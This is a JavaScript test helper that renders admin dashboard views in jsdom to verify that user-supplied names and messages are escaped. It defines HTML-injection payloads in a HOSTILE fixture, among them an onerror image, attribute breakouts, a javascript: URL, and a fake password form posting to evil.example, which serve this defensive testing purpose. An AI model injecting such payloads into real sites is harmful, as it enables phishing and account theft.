/**
 * Render a real admin view (dashboard/views/*.ejs) and run its scripts in jsdom.
 *
 * Used by tests/dashboard/admin-view-escaping/: text from teachers, public
 * sign-ups, chats and model replies must be text in the admin pages, never
 * markup. Anyone can sign up on the public messenger and choose a display
 * name; that name and their messages reach these pages. The admin CSP blocks
 * injected scripts, not injected HTML (a fake sign-in form, a link, a spoofed
 * layout). So the views' scripts escape such values before building HTML with
 * innerHTML (window.escapeHtml, public/js/escape-html.js) and only put http(s)
 * or relative URLs in href/src (window.safeUrl).
 *
 * For tests that feed hostile values through a view's client-side code: the
 * view is rendered with the dashboard's own ejs and the locals its route
 * passes, then loaded in jsdom with scripts enabled. Same-origin scripts
 * (/js/*.js, /vendor/*.js) are served from dashboard/public; anything else
 * loads as empty. window.fetch is a stub that answers from `api`.
 *
 *   const page = await renderAdminView('users', locals, {
 *     url: '/observability/users',
 *     api: { '/observability/api/conversations/': { success: true, ... } },
 *   });
 *   page.document.querySelector(...)
 *
 * HAVE_DASHBOARD_DOM is false when dashboard/node_modules has no ejs or jsdom;
 * tests skip then.
 */

const fs = require('fs');
const path = require('path');
const { createRequire } = require('module');

const DASHBOARD = path.join(__dirname, '../../../dashboard');
const VIEWS = path.join(DASHBOARD, 'views');
const PUBLIC = path.join(DASHBOARD, 'public');
const ORIGIN = 'http://admin.test';
const NONCE = 'dGVzdC1ub25jZS0xMjM0NQ==';

const HAVE_DASHBOARD_DOM = ['ejs', 'jsdom'].every((m) => fs.existsSync(path.join(DASHBOARD, 'node_modules', m)));
const dashboardRequire = createRequire(path.join(DASHBOARD, 'package.json'));

/** Hostile values a public sign-up or a chat message can carry. */
const HOSTILE = Object.freeze({
  // Markup: an element with an id, and a fake sign-in form.
  html: '<img src=x id=pwn onerror=alert(1)><form id=fake action=https://evil.example><input name=password></form>',
  // Breaks out of a double-quoted attribute.
  attr: '"><b id=b2>x</b>',
  // Breaks out of a single-quoted attribute.
  attrSingle: "'><b id=b3>x</b>",
  url: 'javascript:alert(1)',
});

/** Ids the hostile values would create if they were parsed as HTML. */
const INJECTED_SELECTORS = ['#pwn', 'form#fake', '#b2', '#b3'];

/** The admin the routes render for. */
const ADMIN = Object.freeze({ username: 'admin@example.com', userRole: 'super_admin' });

/** Jest: test, or test.skip when the dashboard's ejs/jsdom are not installed (never in CI). */
const maybe = (HAVE_DASHBOARD_DOM || process.env.CI) ? test : test.skip;

/**
 * Jest assertion: the page has none of the elements the hostile values would
 * create, and `root` (an element or a selector) shows each of `texts` as text.
 */
function expectInert(page, root, ...texts) {
  expect(page.injected()).toEqual([]);
  const node = typeof root === 'string' ? page.document.querySelector(root) : root;
  expect(node).not.toBeNull();
  for (const t of texts) expect(node.textContent).toContain(t);
}

const STATUS = Symbol('status');

/** An API answer with a status other than 200: `api: { '/x': respond(500, { message }) }`. */
function respond(status, body) {
  return { [STATUS]: status, body };
}

function jsonResponse(body, status = 200) {
  const text = JSON.stringify(body);
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: { get: () => 'application/json' },
    json: async () => JSON.parse(text),
    text: async () => text,
  };
}

/**
 * @param {string} view      view name under dashboard/views
 * @param {object} locals    the locals the route passes (res.locals from the CSP and
 *                           auth middleware are added)
 * @param {object} [opts]
 * @param {string} [opts.url]  page path
 * @param {object|function} [opts.api]  fetch stub: { pathPrefix: body | (url, init) => body }
 *                             (longest matching prefix wins) or (url, init) => body;
 *                             a body from respond(status, body) answers with that status
 */
async function renderAdminView(view, locals, opts = {}) {
  const ejs = dashboardRequire('ejs');
  const { JSDOM, ResourceLoader, VirtualConsole } = dashboardRequire('jsdom');

  // app.locals as dashboard/index.js sets them, res.locals as the CSP and auth
  // middleware set them, then the route's locals.
  const appLocals = { safeJson: require('../../../dashboard/lib/safe-json').safeJson };
  const resLocals = {
    cspNonce: NONCE,
    isAuthenticated: true,
    username: locals.username || 'admin@example.com',
    userId: 1,
    userEmail: 'admin@example.com',
    userByofRole: null,
    accessScope: null,
    userRole: locals.userRole || 'super_admin',
    isAdmin: true,
  };
  const html = await ejs.renderFile(path.join(VIEWS, `${view}.ejs`), { ...appLocals, ...resLocals, ...locals });

  class PublicLoader extends ResourceLoader {
    fetch(url, options) {
      const u = new URL(url);
      if (u.origin === ORIGIN) {
        const file = path.join(PUBLIC, decodeURIComponent(u.pathname));
        if (file.startsWith(PUBLIC + path.sep) && fs.existsSync(file)) {
          return Promise.resolve(fs.readFileSync(file));
        }
      }
      // External files (fonts, CDN) and missing ones load as empty.
      return Promise.resolve(Buffer.from(''));
    }
  }

  const errors = [];
  const virtualConsole = new VirtualConsole();
  virtualConsole.on('jsdomError', (e) => {
    // jsdom has no canvas, navigation, alert etc.; those are not script errors.
    if (!/Not implemented/.test(e.message)) errors.push(e.message);
  });

  const fetchCalls = [];
  const eventSources = [];
  const api = opts.api || {};
  function answer(url, init) {
    if (typeof api === 'function') return api(url, init);
    const pathname = new URL(url, ORIGIN).pathname;
    const key = Object.keys(api).filter((k) => pathname.startsWith(k)).sort((a, b) => b.length - a.length)[0];
    if (!key) return undefined;
    return typeof api[key] === 'function' ? api[key](url, init) : api[key];
  }

  const dom = new JSDOM(html, {
    url: ORIGIN + (opts.url || '/observability'),
    runScripts: 'dangerously',
    resources: new PublicLoader(),
    pretendToBeVisual: true,
    virtualConsole,
    beforeParse(window) {
      window.fetch = async (url, init) => {
        fetchCalls.push({ url: String(url), init });
        const body = answer(String(url), init);
        if (body === undefined) return jsonResponse({ success: false, error: 'not stubbed' }, 404);
        if (body && body[STATUS]) return jsonResponse(body.body, body[STATUS]);
        return jsonResponse(body);
      };
      // jsdom has no EventSource; tests push server events with emit(type, data).
      window.EventSource = class FakeEventSource {
        constructor(url) {
          this.url = String(url);
          this.listeners = {};
          eventSources.push(this);
        }
        addEventListener(type, fn) { (this.listeners[type] = this.listeners[type] || []).push(fn); }
        close() { this.closed = true; }
        emit(type, data) {
          for (const fn of this.listeners[type] || []) fn({ type, data: JSON.stringify(data) });
        }
      };
      window.confirm = () => true;
      window.alert = () => {};
      window.scrollTo = () => {};
      window.HTMLElement.prototype.scrollIntoView = function scrollIntoView() {};
      window.HTMLMediaElement.prototype.load = function load() {};
      window.HTMLMediaElement.prototype.play = function play() { return Promise.resolve(); };
      window.HTMLMediaElement.prototype.pause = function pause() {};
    },
  });

  const { window } = dom;
  await new Promise((resolve) => {
    if (window.document.readyState === 'complete') resolve();
    else window.addEventListener('load', () => resolve());
  });

  /** Let pending fetches, promise chains and short timers run. */
  async function settle(rounds = 10) {
    for (let i = 0; i < rounds; i++) {
      await new Promise((r) => window.setTimeout(r, 0));
    }
  }
  await settle();

  /** Elements the hostile values would have created, by selector. */
  function injected() {
    return INJECTED_SELECTORS.filter((s) => window.document.querySelector(s));
  }

  return {
    window,
    document: window.document,
    html,
    errors,
    fetchCalls,
    eventSources,
    settle,
    injected,
    close: () => window.close(),
  };
}

module.exports = {
  renderAdminView,
  respond,
  expectInert,
  maybe,
  ADMIN,
  HAVE_DASHBOARD_DOM,
  HOSTILE,
  INJECTED_SELECTORS,
  NONCE,
  ORIGIN,
};
